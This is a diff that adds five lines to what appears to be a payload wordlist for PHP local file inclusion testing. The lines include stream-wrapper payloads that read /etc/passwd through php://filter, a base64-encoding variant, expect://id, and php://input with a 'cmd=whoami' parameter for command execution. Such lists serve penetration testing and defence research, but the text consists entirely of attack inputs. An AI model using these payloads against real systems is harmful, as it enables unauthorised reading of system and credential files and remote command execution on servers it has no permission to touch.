@@ -1,0 +1,5 @@
+data:text/plain,injected
+expect://id
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/resource=/etc/passwd
+php://input&cmd=whoami
